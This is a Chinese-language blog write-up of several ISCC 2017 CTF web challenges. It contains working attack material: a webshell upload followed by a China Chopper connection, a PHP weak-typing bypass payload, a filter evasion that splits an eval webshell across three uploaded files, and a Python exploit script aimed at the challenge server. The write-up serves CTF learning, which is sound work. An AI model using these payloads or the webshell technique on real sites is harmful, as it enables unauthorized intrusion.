---
title: ISCC2017部分题WriteUp
date: 2017-05-29 20:21:22
tags:
- CTF
- Writeup
categories: 
- CTF
---


ISCC这次的题目除了那道jpg和txt的题目是真的有意思，其他的题目感觉差点“意思”。
<!--more-->
### 00x1 Web签到题，来和我换flag啊！

![](https://ooo.0o0.ooo/2017/06/15/59427caf7739d.png)



### 00x2 WelcomeToMySQL


源码
hint:$servername,$username,$password,$db,$tb is set in ../base.php
上传pht，连上菜刀，查看目录底下的base.php为数据库密码
连上数据库，查看flag的字段。
![](https://ooo.0o0.ooo/2017/06/15/59427cc21f6c6.png)


### 00x3 我们一起来日站

扫目录，robots.txt
![](https://ooo.0o0.ooo/2017/06/15/59427cd57f4fd.png)
再扫描/2   那个很长的目录，看见后台。
![](https://ooo.0o0.ooo/2017/06/15/59427ce434c79.png)
这边有点小问题，按照万能密码的特性，这个应该不用输入第二个 ，猜测他的sql语句，username和password分开，没有用and连接


### 00x4 自相矛盾

~~~PHP
<?php
$v1 = 0;
$v2 = 0;
$v3 = 0;

$a = (array) json_decode(@$_GET['iscc']);

if (is_array($a)) {
    is_numeric(@$a["bar1"]) ? die("nope") : NULL; //输入数字2017e就变成不是数字型数字了
    if (@$a["bar1"]) {
        ($a["bar1"] > 2016) ? $v1 = 1 : NULL;
    }

    if (is_array(@$a["bar2"])) {
//判断是否是array
        if (count($a["bar2"]) !== 5 OR !is_array($a["bar2"][0])) {
            //判断数组个数或者第0位是否为数组
            die("nope");
        }

        $pos = array_search("nudt", $a["bar2"]); //搜索是否存在value是nudt的
        $pos === false ? die("nope") : NULL;
        foreach ($a["bar2"] as $key => $val) {
            $val === "nudt" ? die("nope") : NULL;
        }
        $v2 = 1;
    }
}
$c = @$_GET['cat'];
$d = @$_GET['dog'];
if (@$c[1]) {
    if (!strcmp($c[1], $d) && $c[1] !== $d) {

        eregi("3|1|c", $d . $c[0]) ? die("nope") : NULL;
        strpos(($c[0] . $d), "isccctf2017") ? $v3 = 1 : NULL;

    }

}
var_dump($v1, $v2, $v3);

?>  
~~~

这道题目的意思是要让$v1，$v2，$v3的值都为1时，输出flag。
GET方式传入的是一个json。需要绕过好几个点，第一个点，需要判断的是$a[bar1]是否是数字型字符串，不是的话进入下一步，并且判断是否>2016，是的话$v1=1，这个自相矛盾了。输入2017a利用PHP弱类型的类型转换就可以绕过。
第二个点是他给的代码感觉有点绕，$a[bar2]首先必须是a[4]元素必须有5个，并且第0位必须也为数组（数组套数组）,否则输出“nope”。然后是$a[bar2]里面不能有“nubt”这个字符串，下面的if判断里面，遍历bar2这个数组，里面要有“nubt”，否则输出“nope”，这个叶子向矛盾了，所以又要利用到PHP弱类型的，0=任意字符，让$v2=1的方法就是$a[bar2]=[[],2,3,4,0]。
第三个点，判断$c[1]跟$d是否长度一致并且是否相等，这个可以用array型和string型比较返回NULL来绕过，进入条件语句， $d加上$c[0]中必须要有3或1或c，可以用%00截断来绕过，最后绕过strops()，必须返回1，所以可以这么构造。    
~~~  
cat[1][]=1&dog=%00&cat[0]=0isccctf2017
~~~
最终payload为
~~~
iscc={"bar1":"2017g","bar2":[[1],2,3,4,0]}&cat[1][]=1&dog=%00&cat[0]=0isccctf2017
~~~
这道题就是综合考察PHP弱类型的，本来对这个弱类型了解的也不太多，然后今天回想这道题目的时候就查到一篇文章，[PHP黑魔法](http://www.am0s.com/ctf/128.html?utm_source=tuicool&utm_medium=referral)
知识点总结的很好。

### 00x5 I have a jpg,i upload a txt.


题目忘了，但是还好有题目描述，
题目描述：
小明发现，php将上传的jpg文件流写入一个txt中，再重命名后缀为jpg还可以正常读取，于是写了一段上传代码，会不会有什么漏洞呢？


代码：
~~~PHP
<?php
include 'hanshu.php';
if (isset($_GET['do'])) {
    $do = $_GET['do'];
    if ($do == upload) //如果do内容是upload
    {
        if (empty($_FILES)) {
//文件流不存在东西就出现上传目录
            //文件上传页面
            $html1 = <<<HTML1
            <form action="index.php?do=upload" method="post" enctype="multipart/form-data">
            <input type="file" name="filename">
            <input type="submit" value="upload">
            </form>
HTML1;
            echo $html1;
        } else {
            $file = @file_get_contents($_FILES["filename"]["tmp_name"]);
            if (empty($file)) {
                die('do you upload a file?');
            } else {
                if ((strpos($file, '<?') > -1) || (strpos($file, '?>') > -1) || (stripos($file, 'php') > -1) || (stripos($file, '<script') > -1) || (stripos($file, '</script') > -1)) {
//检测上传的file是否存在php和<script>的脚本
                    die('you can\' upload this!');
                } else {
                    //上传不存在上述脚本变量的就变成txt放入随机生成的目录里
                    $rand = mt_rand();
                    $path = '/var/www/html/web-03/uploads/' . $rand . '.txt';
                    file_put_contents($path, $file);
                    echo 'your upload success!./uploads/' . $rand . '.txt';
                }
            }

        }

    } elseif ($do == rename) {
//如果do内容是rename
        if (isset($_GET['re'])) {
            $re = $_GET['re'];
            $re2 = @unserialize(base64_decode(unKaIsA($re, 6))); //就是将下面KaISA的复杂数组值传入
            if (is_array($re2)) {
                if (count($re2) == 2) {
//判断数组个数
                    $rename = 'txt';
                    $rand = mt_rand();
                    $fp = fopen('./uploads/' . $rand . '.txt', 'w');
                    foreach ($re2 as $key => $value) {
                        //遍历re2
                        if ($key == 0) {
                            //$re2数组中第0位元素，那么 rename值就变成$value
                            $rename = $value;
                        } else {
                            if (file_exists('./uploads/' . $value . '.txt') && is_numeric($value)) {
                                //如果存在rename表单里面输入的$value.txt并且值为数字型字符串
                                $file = file_get_contents('./uploads/' . $value . '.txt'); //将文件写入字符串
                                fwrite($fp, $file); //写入文件
                            }
                        }
                    }
                    fclose($fp);
                    waf($rand, $rename);
                    rename('./uploads/' . $rand . '.txt', './uploads/' . $rand . '.' . $rename);
                    echo "you success rename!./uploads/$rand.$rename";
                }
            } else {
                echo 'please not hack me!';
            }
        } elseif (isset($_POST['filetype']) && isset($_POST['filename'])) {
            $filetype = $_POST['filetype'];
            $filename = $_POST['filename'];
            if ((($filetype == 'jpg') || ($filetype == 'png') || ($filetype == 'gif')) && is_numeric($filename)) {
                $re = KaIsA(base64_encode(serialize(array($filetype, $filename))), 6); // 序列化filetype，filename数组，base64编码再凯撒6位
                var_dump(serialize(array($filetype, $filename)));
                var_dump(base64_encode(serialize(array($filetype, $filename))));
                header("Location:index.php?do=rename&re=$re");
                exit();
            } else {
                echo 'you do something wrong';
            }
        } else {
            $html2 = <<<HTML2
            <form action="index.php?do=rename" method="post">
filetype: <input type="text" name="filetype" /> please input the your file's type
</br>
filename: <input type="text" name="filename" /> please input your file's numeric name,like 12345678
</br>
<input type="submit" />
</form>
HTML2;
            echo $html2;

        }
    }

} else {
    show_source(__FILE__);
}
?>
~~~

没法复现这道题目，少了几个关键的php，虽然能够看出来那个是凯撒加密的函数php，还有一个waf函数，但是代码能力太渣了。菜鸡web狗有的时候就是这样难受，做CTF拿到小部分原码复现不了真个题目。。。
这道题目代码逻辑大概流程。
Get进去的do从那数如果为，upload，则进入upload页面，如果为rename，就进入重命名页面。
在上传页面中，在代码的第22行有一个检测上传file是否存在php和`<script>`常见脚本的if判断，这是一个关键点，如果没有就把上传的文件放入在/uploads/下的一个随机数文件夹里，看到第27行的mt_rand()时，心里一抖，想到了wonderkun师傅关于[随机数漏洞](http://wonderkun.cc/index.html/?cat=1)的文章，可惜这道题目没有关联。
然后是rename页面，代码写的很乱，缕一缕思路，重命名页面的代码逻辑就是。GET进去的re参数先进行凯撒再base64再反序列化最后赋值给re2，如果数组长度为2（即里面只有filetype和filename），就创建一个新的随机数txt，再把数组的第0位值保存为rename值，如果数组没有第0位并且value值为数字型字符，就打开这个value.txt，再把内容保存到新随机数.txt，最后把新随机数.txt重命名为新随机数.rename。
这个代码我都看吐了，当初看了好久好久都没理清楚，还是大佬教我我才搞懂的。。。
这个题目其实就是一个逻辑漏洞，我可以通过re传入的3个文件来绕过对"<?""php""`<script>`"的检测，然后在通过有第0位的re传入来重命名txt为php，这样就成功上传了webshell了。
3个php文件分别为

> 1.php  =>    <  
> 2.php  =>    ?ph  
> 3.php  =>    p eval($_GET['a']);




- **EXP**
~~~python
#-*- coding:utf-8 -*-

import phpserialize
import sys
import base64

def change(c,i):
    num = ord(c)
    if num >= 97 and num <= 122:
        num = 97 + ((num - 97) + i) % 26
    elif num >= 65 and  num <= 90:
        num = 65 + ((num - 65) + i) % 26
    return chr(num)


def kaisa(string,i):
    string_new = ''
    for s in string:
        string_new += change(s,i)
    return string_new


def main(string):
    # 获取凯撒位移6的加密内容
    kaisa_6 = kaisa(string,6)
    # 获取凯撒位移20的加密内容
    kaisa_20 = kaisa(string,20)

    code = ""
    for x in range(0,len(kaisa_6)):
        kaisa_6_ord = ord(kaisa_6[x])
        kaisa_20_ord = ord(kaisa_20[x])

        #判断凯撒位移20的是否是小写的值，是的话就加上
        if kaisa_20_ord >= 97 and kaisa_20_ord <= 122:
            code += str(kaisa_20[x])
        else:
            code += str(kaisa_6[x])
    return code

def request(code):
    import re
    import requests
    url = "http://139.129.108.53:3366/web-03/index.php?do=rename&re=%s" % (code)
    check = "http://139.129.108.53:3366/web-03"
    try:
        response  = requests.get(url, verify=False, timeout=5)
        reg = "rename\!\.(.*?)</body"
        path = re.findall(reg,response.content)
        if len(path) >= 1:
            print check+path[0]
    except Exception,e:
        print(e)

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        lists = [sys.argv[1],sys.argv[2]]      #重命名
        # lists = {1:sys.argv[1], 2:sys.argv[2]}  #合并
        # print phpserialize.dumps(lists)
        string = base64.b64encode(phpserialize.dumps(lists))
        code = main(string)
        request(code)
    else:
        print(u'sys')
~~~



